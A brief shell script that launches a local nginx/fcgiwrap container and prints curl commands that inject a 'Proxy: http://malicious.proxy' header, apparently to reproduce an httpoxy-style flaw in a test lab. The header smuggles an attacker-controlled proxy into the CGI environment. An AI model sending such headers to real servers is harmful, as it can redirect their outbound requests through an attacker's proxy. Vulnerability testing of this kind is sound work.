#!/bin/sh

docker run --init -p 8080:80 --rm -d  \
-v $(pwd)/nginx-default.conf:/etc/nginx/sites-available/default \
-v $(pwd)/test.py:/usr/lib/cgi-bin/test.py \
-e hHTTP_PROXY="http://legacy.proxy" \
-e HTTPmarcin=abc \
nginx-fcgiwrap

echo "Hit me with followig curl:"
echo "curl -H \"Proxy: http://malicious.proxy\" http://localhost:8080/cgi-bin/test.py"
echo "OR with multiple headers:"
echo "curl -H \"Proxy: http://malicious.proxy\" -H \"Test: abc\" http://localhost:8080/cgi-bin/test.py"


